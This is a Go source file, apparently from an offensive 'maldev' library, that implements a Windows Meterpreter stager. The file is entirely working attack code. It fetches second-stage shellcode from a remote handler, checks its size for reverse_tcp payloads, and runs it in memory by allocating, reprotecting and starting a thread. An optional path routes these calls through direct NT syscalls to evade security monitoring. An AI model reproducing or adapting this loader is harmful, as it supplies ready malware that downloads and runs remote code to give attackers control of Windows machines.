//go:build windows

package meterpreter

import (
	"fmt"
	"runtime"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
	"golang.org/x/sys/windows"
)

// platformSpecificStage handles Windows staging.
func (s *Stager) platformSpecificStage() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("this code should only run on Windows")
	}
	return s.stageWindows()
}

// stageWindows fetches and executes the stage on Windows.
func (s *Stager) stageWindows() error {
	shellcode, err := s.fetchStage()
	if err != nil {
		return fmt.Errorf("failed to fetch stage: %w", err)
	}

	if len(shellcode) > 500*1024 {
		return fmt.Errorf("received payload too large (%d bytes), probably stageless instead of staged. "+
			"Use handler with staged payload (e.g., windows/x64/meterpreter/reverse_tcp, NOT meterpreter_reverse_tcp)", len(shellcode))
	}

	if len(shellcode) < 50 {
		return fmt.Errorf("received payload too small (%d bytes), invalid stage", len(shellcode))
	}

	// Delegate to custom injector when provided.
	if s.config.Injector != nil {
		return s.config.Injector.Inject(shellcode)
	}

	// Default: self-injection via VirtualAlloc+CreateThread with optional
	// NT syscall routing through Caller.
	var caller *wsyscall.Caller
	if s.config.Caller != nil {
		var ok bool
		caller, ok = s.config.Caller.(*wsyscall.Caller)
		if !ok {
			return fmt.Errorf("Config.Caller must be *wsyscall.Caller, got %T", s.config.Caller)
		}
	}

	return executeInMemory(shellcode, caller)
}

// executeInMemory allocates RW memory, copies shellcode, re-protects as
// RX, then executes via CreateThread. The two-step allocation avoids
// mapping memory as simultaneously writable and executable (RWX).
//
// When caller is non-nil, security-sensitive calls (VirtualAlloc, VirtualProtect,
// CreateThread) are routed through NT syscalls via the Caller. Pass nil for
// standard WinAPI behavior.
func executeInMemory(shellcode []byte, caller *wsyscall.Caller) error {
	size := uintptr(len(shellcode))

	// 1. Allocate RW memory
	var addr uintptr
	if caller != nil {
		currentProcess := ^uintptr(0)
		regionSize := size
		r, err := caller.Call("NtAllocateVirtualMemory",
			currentProcess,
			uintptr(unsafe.Pointer(&addr)),
			0,
			uintptr(unsafe.Pointer(&regionSize)),
			windows.MEM_COMMIT|windows.MEM_RESERVE,
			uintptr(windows.PAGE_READWRITE),
		)
		if r != 0 {
			return fmt.Errorf("NtAllocateVirtualMemory failed: NTSTATUS 0x%X: %w", uint32(r), err)
		}
	} else {
		var err error
		addr, err = windows.VirtualAlloc(
			0, size,
			windows.MEM_COMMIT|windows.MEM_RESERVE,
			windows.PAGE_READWRITE,
		)
		if err != nil {
			return fmt.Errorf("VirtualAlloc failed: %w", err)
		}
	}

	// 2. Copy shellcode (RtlMoveMemory is a memcpy — not security-sensitive)
	_, _, _ = api.ProcRtlMoveMemory.Call(
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		size,
	)

	// 3. Re-protect as executable
	var oldProtect uint32
	if caller != nil {
		currentProcess := ^uintptr(0)
		protectAddr := addr
		protectSize := size
		r, err := caller.Call("NtProtectVirtualMemory",
			currentProcess,
			uintptr(unsafe.Pointer(&protectAddr)),
			uintptr(unsafe.Pointer(&protectSize)),
			uintptr(windows.PAGE_EXECUTE_READ),
			uintptr(unsafe.Pointer(&oldProtect)),
		)
		if r != 0 {
			return fmt.Errorf("NtProtectVirtualMemory failed: NTSTATUS 0x%X: %w", uint32(r), err)
		}
	} else {
		if err := windows.VirtualProtect(addr, size, windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
			return fmt.Errorf("VirtualProtect failed: %w", err)
		}
	}

	// 4. Create thread to execute
	var thread uintptr
	if caller != nil {
		currentProcess := ^uintptr(0)
		r, err := caller.Call("NtCreateThreadEx",
			uintptr(unsafe.Pointer(&thread)),
			uintptr(api.ThreadAllAccess),
			0,
			currentProcess,
			addr,
			0,
			0, 0, 0, 0, 0,
		)
		if r != 0 {
			return fmt.Errorf("NtCreateThreadEx failed: NTSTATUS 0x%X: %w", uint32(r), err)
		}
	} else {
		var err error
		thread, _, err = api.ProcCreateThread.Call(
			0, 0, addr, 0, 0, 0,
		)
		if thread == 0 {
			return fmt.Errorf("CreateThread failed: %w", err)
		}
	}

	// NOTE: WaitForSingleObject(INFINITE) blocks until the thread exits.
	// This does not support context.Context cancellation because the Windows
	// API has no interruptible wait that accepts a Go context. The stage
	// payload is expected to run indefinitely (Meterpreter session).
	windows.WaitForSingleObject(windows.Handle(thread), windows.INFINITE)
	windows.CloseHandle(windows.Handle(thread))

	return nil
}
